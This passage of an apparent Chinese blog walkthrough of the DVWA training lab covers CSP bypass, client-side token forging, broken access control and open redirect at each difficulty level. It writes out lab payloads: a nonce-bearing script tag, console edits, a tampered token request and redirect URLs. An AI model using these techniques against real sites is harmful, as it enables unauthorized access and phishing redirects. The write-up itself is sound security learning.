+<p>这行代码设置了 CSP，限制了可以执行的 JavaScript。在允许执行来自同源的脚本（<code>&#39;self&#39;</code>）、内联脚本，以及拥有特定 nonce 的脚本</p>
+<p><code>&#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;</code> 是一个 base64 编码的字符串，用于标识某些允许执行的脚本</p>
+<p>可以直接输入这个脚本，出现弹窗</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222112926.png" alt="image-20240522211240817"></p>
+
+        <h2 id="High-12"   >
+          <a href="#High-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-12" class="headerlink" title="High"></a>High</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261116135.png" alt="image-20240526111605040"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261117729.png" alt="image-20240526111702652"></p>
+<p>只能引用允许本页面加载的脚本执行</p>
+<p>这里还有一个js文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261119437.png" alt="image-20240526111950354"></p>
+<p>点击按钮后js生成一个script标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中</p>
+<p>js 中定义了一个 solveNum 的函数，因此 script 标签会把远程加载的 solveSum({“answer”:”15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数, 然后这个函数就会在界面适当的位置写入答案</p>
+<p>不是特别明白…</p>
+
+        <h2 id="Impossible-12"   >
+          <a href="#Impossible-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128991.png" alt="image-20240526112822921"></p>
+<p>再查看源代码，主要是impossible.js文件有改变</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128097.png" alt="image-20240526112858026"></p>
+<p>没有了callback参数</p>
+
+        <h1 id="十四、JavaScript"   >
+          <a href="#十四、JavaScript" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、JavaScript" class="headerlink" title="十四、JavaScript"></a>十四、JavaScript</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222153568.png" alt="image-20240522215322484"></p>
+
+        <h2 id="Low-13"   >
+          <a href="#Low-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-13" class="headerlink" title="Low"></a>Low</h2>
+      <p>尝试输入success提交，但是显示token不合法</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222154246.png" alt="image-20240522215454191"></p>
+<p>输入success抓包看看</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222156874.png" alt="image-20240522215642794"></p>
+<p>再输入默认值ChangeMe抓包看看</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222157635.png" alt="image-20240522215732578"></p>
+<p>发现token的值并没有发生改变，说明生成token的代码并不是写在服务端的，查看前端的源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222200703.png" alt="image-20240522220040623"></p>
+<p>从页面中的元素（其 ID 为 “phrase”）获取用户输入的值，<code>rot13(phrase)</code>函数是将输入的字符串进行 ROT13 加密，接着，使用 MD5 哈希算法对 ROT13 加密后的字符串进行哈希</p>
+<p>下断点，然后点击提交</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222207601.png" alt="image-20240522220700537"></p>
+<p>此时我提交的是success，但是它的phrase依然是ChangeMe，所以需要将它的默认值改成success，这样才能生成success的token</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222208476.png" alt="image-20240522220849405"></p>
+<p>或者是在控制台修改phrase的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230955703.png" alt="image-20240523095517658"></p>
+<p>再输入success进行提交</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222209278.png" alt="image-20240522220938221"></p>
+<p>查看源代码，也主要是写明了token的生成</p>
+
+        <h2 id="Medium-13"   >
+          <a href="#Medium-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>提交之后还是说token不合法</p>
+<p>分别输入ChangeMe和success提交并抓包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915098.png" alt="image-20240523091542059"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915136.png" alt="image-20240523091554103"></p>
+<p>token也是没有变化，看一下它的js代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230906036.png" alt="image-20240523090644988"></p>
+<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的反向（即从后到前重新排列的字符串）</p>
+<p><code>setTimeout()</code> 是 JavaScript 中用于实现延时执行的函数，这里的延时设置为 300 毫秒后执行 <code>do_elsesomething()</code>，传入字符串 <code>&quot;XX&quot;</code> 作为参数</p>
+<p>函数从页面中获取 <code>id</code> 为 <code>&quot;phrase&quot;</code> 的 HTML 元素的值，它将这个值与参数 <code>e</code> 和字符串 <code>&quot;XX&quot;</code> 拼接，使用 <code>do_something()</code> 函数对拼接后的字符串进行反转，最后，将反转后的结果赋值给 <code>id</code> 为 <code>&quot;token&quot;</code> 的元素的 <code>value</code> 属性</p>
+<p>所以可以直接在burp里修改token的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=XXsseccusXX&amp;phrase=success&amp;send=Submit</span><br></pre></td></tr></table></div></figure>
+
+<p>也可以在控制台上修改phrase的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>
+
+<p>发送，提交成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230917698.png" alt="image-20240523091738663"></p>
+<p>查看源代码，主要也是这个js文件</p>
+
+        <h2 id="High-13"   >
+          <a href="#High-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-13" class="headerlink" title="High"></a>High</h2>
+      <p>分别提交ChangeMe和success并抓包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230927665.png" alt="image-20240523092759627"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928215.png" alt="image-20240523092813180"></p>
+<p>token也是没有变化的，查看js代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928497.png" alt="image-20240523092834450"></p>
+<p>有点没看懂，查资料说是被混淆了，那就找一个反混淆的网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/" >http://deobfuscatejavascript.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>然后又发现选中浏览器右侧的 mouse 监听 click 事件，再点击页面的提交，此时浏览器就会自动解码 JS</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951922.png" alt="image-20240523095146856"></p>
+<p>然后在 token_part_1 下断点：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951593.png" alt="image-20240523095103539"></p>
+<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的逆序</p>
+<p><code>token_part_1(a, b)</code> 函数调用 <code>do_something()</code> 函数，并设置 <code>id</code> 为 “token” 的 HTML 元素的 <code>value</code> 为 <code>phrase</code> 元素的值的逆序</p>
+<p><code>token_part_2(e = &quot;YY&quot;)</code> 函数使用默认参数 “YY”，将其与 “token” 元素的当前值连接，并使用 SHA-256 算法进行哈希</p>
+<p><code>token_part_3(t, y = &quot;ZZ&quot;)</code> 函数类似于 <code>token_part_2</code>，但它允许通过按钮点击事件触发，并将 “token” 元素的值与 “ZZ” 进行连接后进行哈希</p>
+<p>关键还是这个phrase，在控制台上修改它的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>
+
+<p>再点击提交即可成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230948877.png" alt="image-20240523094848838"></p>
+<p>源代码主要也是这个js文件</p>
+
+        <h2 id="Impossible-13"   >
+          <a href="#Impossible-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230956126.png" alt="image-20240523095638089"></p>
+<p>直接让其没有输入了</p>
+
+        <h1 id="十五、越权"   >
+          <a href="#十五、越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、越权" class="headerlink" title="十五、越权"></a>十五、越权</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231005923.png" alt="image-20240523100542855"></p>
+<p>由于现在我登录的是admin管理员账号，所以能对这些用户进行操作</p>
+<p>但当我登录gordonb账号时就没有这个页面了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231007763.png" alt="image-20240523100727722"></p>
+
+        <h2 id="Low-14"   >
+          <a href="#Low-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-14" class="headerlink" title="Low"></a>Low</h2>
+      <p>登录gordonb账号时，当我把之前登录管理员账号时的网页复制粘贴，就能看到现在是gordonb拥有操作权限</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231009624.png" alt="image-20240523100933570"></p>
+
+        <h2 id="Medium、High、Impossible"   >
+          <a href="#Medium、High、Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium、High、Impossible" class="headerlink" title="Medium、High、Impossible"></a>Medium、High、Impossible</h2>
+      <p>按同样的操作粘贴后却显示未授权</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231011368.png" alt="image-20240523101144332"></p>
+<p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231013397.png" alt="image-20240523101308357"></p>
+<p>都设置了只有当前用户是admin时才能进行访问</p>
+
+        <h1 id="十六、重定向"   >
+          <a href="#十六、重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、重定向" class="headerlink" title="十六、重定向"></a>十六、重定向</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026658.png" alt="image-20240523102612620"></p>
+
+        <h2 id="Low-15"   >
+          <a href="#Low-15" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-15" class="headerlink" title="Low"></a>Low</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026879.png" alt="image-20240523102642842"></p>
+<p>这段代码检查 URL 参数 <code>redirect</code> 是否存在且不为空，如果满足条件，则通过 <code>header</code> 函数发送一个 HTTP 重定向到该参数指定的 URL</p>
+<p>没有任何过滤，可以直接传参一个网页给redirect</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/</span><br></pre></td></tr></table></div></figure>
+
+<p>直接就跳转到百度了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028188.png" alt="image-20240523102803107"></p>
+
+        <h2 id="Medium-14"   >
+          <a href="#Medium-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-14" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028988.png" alt="image-20240523102855951"></p>
+<p>过滤了http://和https://</p>
+<p>使用代理页面：创建一个中间代理页面，用户访问该页面时，该页面再将请求重定向到百度。</p>
+<p>创建一个名为 redirect.php 的 PHP 文件。<br>在 redirect.php 文件中添加以下代码：<br><?php
+header("Location: http://www.baidu.com");
+exit;
+?></p>
+<p>上传 redirect.php 文件到服务器上，确保它可以被公开访问（例如放置在公共的网站根目录）。</p>
+<p>当用户访问 redirect.php 页面时，会被自动重定向到百度的绝对 URL。</p>
+
+        <h2 id="High-14"   >
+          <a href="#High-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-14" class="headerlink" title="High"></a>High</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231051923.png" alt="image-20240523105101881"></p>
+<p>检查 <code>redirect</code> 参数中是否包含 “info.php” 字符串</p>
+<p>可以让任意一个参数的值设置为info.php</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/?a=info.php</span><br></pre></td></tr></table></div></figure>
+
+<p>重定向到了百度</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231055647.png" alt="image-20240523105532585"></p>
+
+        <h2 id="Impossible-14"   >
+          <a href="#Impossible-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-14" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p>查看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231057619.png" alt="image-20240523105737570"></p>
+<p>首先检查 <code>redirect</code> 是否存在于 GET 请求中，并且确认它的值是数字</p>
+<p><code>intval</code> 函数用于确保 <code>redirect</code> 参数被当作整数处理</p>
+<p><code>switch</code> 语句根据 <code>redirect</code> 的整数值选择不同的目标 URL</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/">http://example.com/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">DVWA靶场练习</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">pikachu-学习</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/10/14/XSS%E6%94%BB%E5%87%BB/"><span class="paginator-prev__text">XSS攻击</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">
+          一、暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low"><span class="toc-number">2.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium"><span class="toc-number">3.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">4.</span> <span class="toc-text">
+          High</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89token%E6%97%B6%E7%9A%84burpsuite%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.0.0.0.1.</span> <span class="toc-text">
+          有token时的burpsuite暴力破解</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible"><span class="toc-number">5.</span> <span class="toc-text">
+          Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%EF%BC%9A%E9%80%9A%E8%BF%87%E8%B7%9F%E8%B8%AA%E7%94%A8%E6%88%B7%E5%A4%B1%E8%B4%A5%E7%9A%84%E7%99%BB%E5%BD%95%E5%B0%9D%E8%AF%95%E6%AC%A1%E6%95%B0%E6%9D%A5%E9%98%B2%E6%AD%A2%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E3%80%82%E5%A6%82%E6%9E%9C%E5%A4%B1%E8%B4%A5%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%873%E6%AC%A1%EF%BC%8C%E8%B4%A6%E6%88%B7%E5%B0%86%E8%A2%AB%E9%94%81%E5%AE%9A15%E5%88%86%E9%92%9F"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">
+          关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">
+          二、命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-1"><span class="toc-number">7.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-1"><span class="toc-number">8.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-1"><span class="toc-number">9.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-1"><span class="toc-number">10.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81CSRF"><span class="toc-number"></span> <span class="toc-text">
+          三、CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-2"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-2"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-2"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-2"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number"></span> <span class="toc-text">
+          四、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-3"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-3"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99"><span class="toc-number">2.1.</span> <span class="toc-text">
+          双写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">2.2.</span> <span class="toc-text">
+          使用绝对路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-3"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-3"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number"></span> <span class="toc-text">
+          五、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-4"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-4"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-4"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-4"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number"></span> <span class="toc-text">
+          六、不安全的验证码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-5"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-5"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-5"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-5"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">
+          SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-6"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">
+          手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E4%B8%94%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          首先判断是否存在注入且注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">
+          查看列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.3.</span> <span class="toc-text">
+          获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">
+          获取数据表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">
+          查看表字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.6.</span> <span class="toc-text">
+          查看字段内容</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlmap"><span class="toc-number">1.2.</span> <span class="toc-text">
+          Sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">
+          获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D"><span class="toc-number">1.2.2.</span> <span class="toc-text">
+          获取数据库表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">
+          查看表字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">
+          查看字段内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-6"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.0.1.</span> <span class="toc-text">
+          判断注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0-1"><span class="toc-number">2.0.2.</span> <span class="toc-text">
+          查看列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="toc-number">2.0.3.</span> <span class="toc-text">
+          获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D-1"><span class="toc-number">2.0.4.</span> <span class="toc-text">
+          获取数据库表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D-2"><span class="toc-number">2.0.5.</span> <span class="toc-text">
+          查看表字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9-2"><span class="toc-number">2.0.6.</span> <span class="toc-text">
+          查看字段内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-6"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-6"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">
+          八、SQL注入（盲注）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-7"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.</span> <span class="toc-text">
+          布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          判断注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">
+          查看列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.3.</span> <span class="toc-text">
